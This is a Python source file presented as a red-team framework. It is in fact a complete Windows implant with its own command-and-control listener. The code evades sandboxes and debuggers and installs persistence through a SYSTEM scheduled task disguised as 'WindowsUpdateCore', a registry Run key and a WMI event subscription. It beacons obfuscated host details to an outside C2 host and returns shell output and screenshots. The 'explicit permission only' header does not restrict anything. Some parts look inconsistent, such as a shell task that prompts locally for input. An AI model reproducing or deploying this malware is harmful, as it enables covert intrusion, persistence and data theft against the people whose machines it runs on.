#!/usr/bin/env python3
# NSAForge.py - High-Side Persistence & Exfil Framework (NSA-Grade Red Team 2026)
# EPO - Explicit Written Permission ONLY! 💀

import socket
import sys
import time
import random
import base64
import datetime
import os
import subprocess
import getpass
import platform
import json
import threading
import ctypes
import ctypes.wintypes as wintypes
from pathlib import Path
from urllib.request import urlopen, Request

kernel32 = ctypes.windll.kernel32
advapi32 = ctypes.windll.advapi32

# ================= CONFIG =================
DEFAULT_C2_URL = "https://c2.nsa-grade.cool:443/beacon"
SLEEP_MIN = 25
SLEEP_MAX = 180
JITTER = 0.7
XOR_KEY = 0xF1A4E8B9

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0"
]

# ================= UTILITY =================
def timestamp():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def xor(data: bytes) -> bytes:
    return bytes(b ^ (XOR_KEY & 0xFF) for b in data)

def fake_delay(min_sec=10, max_sec=35):
    time.sleep(random.uniform(min_sec, max_sec))

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def is_sandbox():
    checks = [
        is_debugged(),
        len(os.listdir("C:\\")) < 5,
        "sandbox" in getpass.getuser().lower(),
        os.path.exists("C:\\Windows\\System32\\drivers\\vmmouse.sys")
    ]
    return any(checks)

def is_debugged():
    return kernel32.IsDebuggerPresent() != 0

# ================= MULTI-LAYER PERSISTENCE =================
def add_persistence():
    if platform.system() != "Windows" or not is_admin():
        return

    # 1. Schtasks (SYSTEM)
    task_cmd = f'schtasks /create /tn "WindowsUpdateCore" /tr "{sys.executable} {__file__} beacon {DEFAULT_C2_URL}" /sc minute /mo 20 /ru SYSTEM /f /rl HIGHEST'
    subprocess.call(task_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # 2. Registry Run (HKLM)
    try:
        import winreg as reg
        key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "WindowsUpdateCore", 0, reg.REG_SZ, f"{sys.executable} {__file__} beacon {DEFAULT_C2_URL}")
        reg.CloseKey(key)
    except:
        pass

    # 3. WMI permanent event
    wmi_ps = (
        'powershell -Command "$f = New-CimInstance -ClassName __EventFilter -Namespace root/subscription -Property @{Name=\'UpdateFilter\';EventNameSpace=\'root/cimv2\';QueryLanguage=\'WQL\';Query=\'SELECT * FROM __InstanceModificationEvent WITHIN 120 WHERE TargetInstance ISA \\"Win32_LocalTime\\"\'};'
        '$c = New-CimInstance -ClassName CommandLineEventConsumer -Namespace root/subscription -Property @{Name=\'UpdateConsumer\';CommandLineTemplate=\'' + sys.executable + ' ' + __file__ + ' beacon ' + DEFAULT_C2_URL + '\'}};'
        'New-CimInstance -ClassName __FilterToConsumerBinding -Namespace root/subscription -Property @{Filter=$f;Consumer=$c}"'
    )
    subprocess.call(wmi_ps, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print(f"[{timestamp()}] Multi-layer persistence installed")

# ================= BEACON & CONTROL =================
def beacon_loop(c2_url: str):
    backoff = SLEEP_MIN
    print(f"[{timestamp()}] BlackLotus launching → C2: {c2_url}")

    while True:
        try:
            fake_delay(10, 30)

            info = {
                "time": timestamp(),
                "hostname": platform.node(),
                "user": getpass.getuser(),
                "admin": is_admin(),
                "sandbox": is_sandbox(),
                "os": platform.system(),
                "local_ip": socket.gethostbyname(socket.gethostname())
            }
            payload = json.dumps(info)
            obfuscated = base64.b64encode(xor(payload.encode())).decode()

            req = Request(c2_url, data=obfuscated.encode(), headers={'User-Agent': random.choice(USER_AGENTS)})
            with urlopen(req, timeout=25) as resp:
                task = resp.read().decode(errors='ignore').strip()

            if task:
                print(f"[{timestamp()}] Task: {task}")
                handle_task(task, c2_url)

            sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
            jittered = int(sleep_time * (1 + random.uniform(-JITTER, JITTER)))
            print(f"[{timestamp()}] Sleeping {jittered}s")
            time.sleep(jittered)

            backoff = SLEEP_MIN

        except Exception as e:
            print(f"[{timestamp()}] Error: {e}")
            backoff = min(backoff * 2, 14400)
            jittered = int(backoff * (1 + random.uniform(-JITTER, JITTER)))
            time.sleep(jittered)

def handle_task(task: str, c2_url: str):
    if task == "shell":
        cmd = input("Shell> ").strip()
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode(errors='ignore')
        send_result(out, c2_url)
    elif task == "screenshot":
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab()
            img.save("tmp.png")
            with open("tmp.png", "rb") as f:
                data = base64.b64encode(f.read()).decode()
            send_result(data, c2_url)
            os.remove("tmp.png")
        except:
            send_result("Screenshot failed", c2_url)
    elif task == "persist":
        add_persistence()
        send_result("Persistence added", c2_url)

def send_result(result: str, c2_url: str):
    obfuscated = base64.b64encode(xor(result.encode())).decode()
    req = Request(c2_url, data=obfuscated.encode(), headers={'User-Agent': random.choice(USER_AGENTS)})
    urlopen(req)

# ================= C2 LISTENER =================
def c2_listener(host: str, port: int):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(10)
    print(f"[{timestamp()}] C2 listening on {host}:{port}")

    while True:
        client, addr = server.accept()
        print(f"[{timestamp()}] New implant from {addr}")
        data = client.recv(32768).decode(errors='ignore')
        print(data)
        task = input(f"[{addr}] Command> ").strip()
        client.send(task.encode())
        client.close()

# ================= MAIN =================
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python NSAForge.py c2 <host> <port>")
        print("  python NSAForge.py beacon <c2_url>")
        sys.exit(1)

    mode = sys.argv[1].lower()

    if mode == "c2":
        c2_listener(sys.argv[2], int(sys.argv[3]))
    elif mode == "beacon":
        c2_url = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_C2_URL
        add_persistence()
        beacon_loop(c2_url)
    else:
        print("Invalid mode")
        sys.exit(1)